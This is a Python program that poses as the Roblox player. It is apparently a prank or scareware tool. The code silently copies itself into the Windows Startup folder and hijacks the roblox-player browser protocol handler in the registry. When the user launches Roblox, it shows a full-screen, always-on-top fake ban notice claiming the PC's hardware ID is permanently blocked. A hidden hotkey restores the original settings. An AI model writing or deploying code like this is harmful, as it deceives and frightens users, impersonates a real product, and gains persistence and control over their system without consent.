import ctypes
import os
import shutil
import subprocess
import sys
import time
import tkinter as tk
import winreg
from PIL import Image, ImageDraw, ImageFont, ImageOps, ImageTk

# Global log list for the Debug Console (Ctrl+Alt+C)
logs: list[str] = []
cleanup_in_progress = False
_refs: list[ImageTk.PhotoImage] = []

PROTOCOL_KEY_PATH = r"Software\Classes\roblox-player"
STARTUP_EXE_NAME = "RobloxPlayer.exe"


def add_log(message: str) -> None:
    timestamp = time.strftime("%H:%M:%S")
    formatted = f"[{timestamp}] {message}"
    print(formatted)
    logs.append(formatted)


def get_env_dir(var_name: str, fallback: str) -> str:
    value = os.getenv(var_name)
    if value and value.strip():
        return value
    return fallback


def get_startup_exe_path() -> str:
    appdata = get_env_dir("APPDATA", os.path.expanduser("~"))
    return os.path.join(
        appdata, "Microsoft", "Windows", "Start Menu", "Programs", "Startup", STARTUP_EXE_NAME
    )


def get_backup_reg_path() -> str:
    temp_dir = get_env_dir("TEMP", os.path.expanduser("~"))
    return os.path.join(temp_dir, "roblox_player_protocol_backup.reg")


def get_cleanup_batch_path() -> str:
    temp_dir = get_env_dir("TEMP", os.path.expanduser("~"))
    return os.path.join(temp_dir, "cleanup_roblox_player.bat")


# ==========================================
# RESOURCE HANDLING
# ==========================================
def resource_path(relative_path: str) -> str:
    meipass = getattr(sys, "_MEIPASS", None)
    if isinstance(meipass, str) and meipass:
        base_path = meipass
    else:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)


INPUT_IMAGE = resource_path("Screenshot 2026-04-14 183821.png")
ICON_PATH = resource_path("roblox.ico")

WINDOW_TITLE = "Roblox"
BAN_TITLE_TEXT = "Banned for 7 Days"

BAN_CONTENT_TEXT_LINES = [
    ("Our content monitors have determined that your behavior on Roblox has been in", "reg"),
    ("violation of our Terms of Use.", "reg"),
    ("", "reg"),
    ("Reviewed: 2026-04-14 18:38:21 PT", "reg"),
    ("", "reg"),
    ("Moderator Note: Your PC's Hardware ID has been identified and permanently", "reg"),
    ("blocked from all Roblox services. Access is restricted for a severe violation of", "reg"),
    ("our anti-cheating policy.", "reg"),
    ("", "reg"),
    ("Reason: Exploiting / Cheating", "bold"),
    ("Offensive Item: Hardware Identification", "bold"),
    ("", "reg"),
    ("Please abide by the Roblox Community Guidelines so that Roblox can be fun for", "reg"),
    ("users of all ages. Your account has been disabled. You may re-activate it after", "reg"),
    ("4/21/2026 18:38:21 PT.", "reg"),
]

# ==========================================
# INSTALL / RESTORE / CLEANUP LOGIC
# ==========================================
def reg_key_exists(root_key, subkey: str) -> bool:
    try:
        with winreg.OpenKey(root_key, subkey, 0, winreg.KEY_READ):
            return True
    except OSError:
        return False


def delete_reg_key_recursive(key, subkey: str) -> None:
    """Helper to delete registry keys that have sub-keys."""
    try:
        hkey = winreg.OpenKey(key, subkey, 0, winreg.KEY_ALL_ACCESS)
    except OSError:
        return

    try:
        while True:
            try:
                child = winreg.EnumKey(hkey, 0)
                delete_reg_key_recursive(hkey, child)
            except OSError:
                break
    finally:
        winreg.CloseKey(hkey)

    try:
        winreg.DeleteKey(key, subkey)
        add_log(f"CLEANUP: Deleted Registry Key: {subkey}")
    except OSError as exc:
        add_log(f"WARN: Could not delete key {subkey}: {exc}")


def backup_existing_protocol() -> None:
    """Exports an existing roblox-player key once so it can be restored later."""
    backup_path = get_backup_reg_path()
    if os.path.exists(backup_path):
        add_log("INFO: Existing protocol backup already saved.")
        return

    if not reg_key_exists(winreg.HKEY_CURRENT_USER, PROTOCOL_KEY_PATH):
        add_log("INFO: No existing roblox-player registry key to back up.")
        return

    full_reg_target = f"HKEY_CURRENT_USER\\{PROTOCOL_KEY_PATH}"
    try:
        result = subprocess.run(
            ["reg.exe", "export", full_reg_target, backup_path, "/y"],
            capture_output=True,
            text=True,
            creationflags=subprocess.CREATE_NO_WINDOW,
            timeout=10,
        )
        if result.returncode == 0 and os.path.exists(backup_path):
            add_log(f"SUCCESS: Backed up existing protocol to {backup_path}")
        else:
            add_log(f"WARN: Protocol backup returned code {result.returncode}")
    except Exception as exc:
        add_log(f"WARN: Protocol backup failed: {exc}")


def restore_protocol_backup() -> None:
    """Restores the previously backed-up roblox-player registry key if available."""
    backup_path = get_backup_reg_path()
    if not os.path.exists(backup_path):
        add_log("INFO: No protocol backup file found to restore.")
        return

    try:
        result = subprocess.run(
            ["reg.exe", "import", backup_path],
            capture_output=True,
            text=True,
            creationflags=subprocess.CREATE_NO_WINDOW,
            timeout=10,
        )
        if result.returncode == 0:
            add_log("SUCCESS: Restored original roblox-player registry key.")
        else:
            add_log(f"WARN: Registry restore failed with code {result.returncode}")
    except Exception as exc:
        add_log(f"ERROR: Registry restore error: {exc}")
    finally:
        try:
            os.remove(backup_path)
            add_log("CLEANUP: Removed temporary protocol backup file.")
        except OSError:
            pass


def install_and_hijack() -> None:
    if cleanup_in_progress:
        return

    add_log("DEBUG: Initializing persistence check...")
    if not getattr(sys, "frozen", False):
        add_log("INFO: Running from source; skipping frozen executable persistence.")
        return

    source_exe = os.path.realpath(sys.executable)
    dest_exe = get_startup_exe_path()
    startup_dir = os.path.dirname(dest_exe)

    # 1. Startup Copy
    try:
        os.makedirs(startup_dir, exist_ok=True)
        if os.path.abspath(source_exe).lower() == os.path.abspath(dest_exe).lower():
            add_log("INFO: Already running from Startup destination.")
        elif not os.path.exists(dest_exe):
            shutil.copy2(source_exe, dest_exe)
            add_log(f"SUCCESS: Copied to Startup -> {dest_exe}")
        else:
            add_log("INFO: Startup file already present.")
    except Exception as exc:
        add_log(f"ERROR: Startup copy failed: {exc}")

    # 2. Backup & Registry Hijack
    try:
        add_log("DEBUG: Backing up and checking registry protocol...")
        backup_existing_protocol()

        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, PROTOCOL_KEY_PATH) as key:
            winreg.SetValue(key, "", winreg.REG_SZ, "URL:Roblox Protocol")
            winreg.SetValueEx(key, "URL Protocol", 0, winreg.REG_SZ, "")

        cmd_path = PROTOCOL_KEY_PATH + r"\shell\open\command"
        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, cmd_path) as key:
            winreg.SetValue(key, "", winreg.REG_SZ, f'"{dest_exe}" %1')

        add_log("SUCCESS: Registry protocol updated.")
    except Exception as exc:
        add_log(f"ERROR: Registry hijack failed: {exc}")


def full_cleanup(event=None, root_window: tk.Tk | None = None) -> None:
    global cleanup_in_progress
    if cleanup_in_progress:
        return
    cleanup_in_progress = True

    add_log("!!! CLEANUP & RESTORE INITIATED !!!")

    # 1. Remove hijacked key and restore backup if present
    delete_reg_key_recursive(winreg.HKEY_CURRENT_USER, PROTOCOL_KEY_PATH)
    restore_protocol_backup()

    # 2. Schedule safe removal of Startup executable and temporary scripts after exit
    startup_exe = get_startup_exe_path()
    batch_path = get_cleanup_batch_path()
    current_pid = os.getpid()

    batch_content = f"""@echo off
taskkill /PID {current_pid} /F >nul 2>&1
:wait_loop
tasklist /FI "PID eq {current_pid}" 2>nul | find "{current_pid}" >nul
if not errorlevel 1 (
    timeout /t 1 /nobreak >nul
    goto wait_loop
)
:del_loop
if exist "{startup_exe}" (
    del /f /q "{startup_exe}" >nul 2>&1
    if exist "{startup_exe}" (
        timeout /t 1 /nobreak >nul
        goto del_loop
    )
)
del /f /q "%~f0" >nul 2>&1
exit /b 0
"""

    try:
        with open(batch_path, "w", encoding="utf-8") as handle:
            handle.write(batch_content)

        subprocess.Popen(
            ["cmd.exe", "/c", batch_path],
            creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS,
            close_fds=True,
        )
        add_log("SUCCESS: Cleanup helper scheduled.")
    except Exception as exc:
        add_log(f"ERROR: Cleanup script creation failed: {exc}")

    add_log("SYSTEM: Exiting cleanly in 2 seconds...")
    if root_window is not None:
        try:
            show_console(root=root_window)
            root_window.update_idletasks()
        except Exception:
            pass

    time.sleep(2)
    if root_window is not None:
        try:
            root_window.destroy()
        except Exception:
            pass
    sys.exit(0)


# ==========================================
# GUI & LOGGING
# ==========================================
def show_console(event=None, root: tk.Tk | tk.Toplevel | None = None) -> None:
    console = tk.Toplevel(root)
    console.title("RobloxPlayer Debugger")
    console.geometry("700x450")
    console.attributes("-topmost", True)
    console.configure(bg="#0c0c0c")

    header = tk.Label(
        console,
        text="INTERNAL DEBUG LOGS",
        bg="#0c0c0c",
        fg="white",
        font=("Consolas", 10, "bold"),
    )
    header.pack(pady=5)

    txt = tk.Text(
        console,
        bg="#1e1e1e",
        fg="#00FF00",
        font=("Consolas", 10),
        padx=10,
        pady=10,
    )
    txt.pack(fill=tk.BOTH, expand=True)
    for line in logs:
        txt.insert(tk.END, line + "\n")
    txt.config(state=tk.DISABLED)


def create_button_image(
    width: int,
    height: int,
    bg_color: tuple[int, int, int],
    text: str,
    font,
    text_color: tuple[int, int, int],
) -> ImageTk.PhotoImage:
    img = Image.new("RGBA", (width, height), (255, 255, 255, 0))
    draw = ImageDraw.Draw(img)
    draw.rounded_rectangle(
        [0, 0, width, height], radius=5, fill=bg_color, outline=(200, 200, 200), width=1
    )
    bbox = draw.textbbox((0, 0), text, font=font)
    tw, th = bbox[2] - bbox[0], bbox[3] - bbox[1]
    draw.text(
        ((width - tw) // 2, (height - th) // 2 - 2),
        text,
        fill=text_color,
        font=font,
    )
    photo = ImageTk.PhotoImage(img)
    _refs.append(photo)
    return photo


def run_ban_gui() -> None:
    add_log("GUI: Rendering screen...")
    try:
        ctypes.windll.shell32.SetCurrentProcessExplicitAppUserModelID("com.roblox.client.v1")
    except Exception:
        pass

    root = tk.Tk()
    root.title(WINDOW_TITLE)
    root.state("zoomed")
    root.attributes("-topmost", True)
    if os.path.exists(ICON_PATH):
        try:
            root.iconbitmap(ICON_PATH)
        except Exception:
            pass

    sw, sh = root.winfo_screenwidth(), root.winfo_screenheight()

    try:
        pil_image = Image.open(INPUT_IMAGE).convert("RGB")
        pil_image = ImageOps.fit(pil_image, (sw, sh), Image.Resampling.LANCZOS)
        overlay = Image.new("RGB", (sw, sh), (0, 0, 0))
        dark_image = Image.blend(pil_image, overlay, 0.75)
        draw = ImageDraw.Draw(dark_image)

        try:
            title_fnt = ImageFont.truetype("segoeuib.ttf", 36)
            bold_fnt = ImageFont.truetype("segoeuib.ttf", 17)
            reg_fnt = ImageFont.truetype("segoeui.ttf", 17)
            btn_fnt = ImageFont.truetype("segoeuib.ttf", 18)
        except Exception:
            title_fnt = bold_fnt = reg_fnt = btn_fnt = ImageFont.load_default()

        box_w, box_h = 780, 560
        x1, y1 = (sw - box_w) // 2, (sh - box_h) // 2
        x2, y2 = x1 + box_w, y1 + box_h
        draw.rounded_rectangle([x1, y1, x2, y2], radius=10, fill=(255, 255, 255))

        tw = draw.textbbox((0, 0), BAN_TITLE_TEXT, font=title_fnt)[2]
        draw.text(
            (x1 + (box_w - tw) // 2, y1 + 50),
            BAN_TITLE_TEXT,
            fill=(25, 25, 25),
            font=title_fnt,
        )

        curr_y = y1 + 125
        for text, style in BAN_CONTENT_TEXT_LINES:
            fnt = bold_fnt if style == "bold" else reg_fnt
            clr = (25, 25, 25) if style == "bold" else (90, 90, 90)
            draw.text((x1 + 60, curr_y), text, fill=clr, font=fnt)
            curr_y += 12 if text == "" else 26

        bg_photo = ImageTk.PhotoImage(dark_image)
        _refs.append(bg_photo)

        bg_label = tk.Label(root, borderwidth=0)
        bg_label.configure(image=bg_photo)
        bg_label.pack(fill=tk.BOTH, expand=True)

        btn_w, btn_h = 160, 45
        idle_img = create_button_image(
            btn_w, btn_h, (242, 242, 242), "Logout", btn_fnt, (25, 25, 25)
        )
        hover_img = create_button_image(
            btn_w, btn_h, (225, 225, 225), "Logout", btn_fnt, (25, 25, 25)
        )

        btn = tk.Label(root, bg="white", borderwidth=0, cursor="hand2")
        btn.configure(image=idle_img)
        btn.place(x=x1 + (box_w // 2) - (btn_w // 2), y=y2 - 85)
        btn.bind("<Enter>", lambda e: btn.configure(image=hover_img))
        btn.bind("<Leave>", lambda e: btn.configure(image=idle_img))
        btn.bind("<Button-1>", lambda e: root.destroy())

        root.bind(
            "<Control-Alt-grave>", lambda e: full_cleanup(e, root_window=root)
        )
        root.bind("<Control-Alt-c>", lambda e: show_console(e, root=root))
        root.bind("<Escape>", lambda e: root.destroy())

    except Exception as exc:
        add_log(f"GUI ERROR: {exc}")
        root.destroy()

    root.mainloop()


if __name__ == "__main__":
    add_log("SYSTEM: Bootstrapping RobloxPlayer...")

    if any(arg.lower() == "--cleanup" for arg in sys.argv[1:]):
        full_cleanup()

    install_and_hijack()

    if any("roblox-player:" in arg.lower() for arg in sys.argv[1:]):
        add_log("SYSTEM: Browser Protocol Detected.")
        run_ban_gui()
    else:
        add_log("SYSTEM: Background Persistent Mode.")
        sys.exit(0)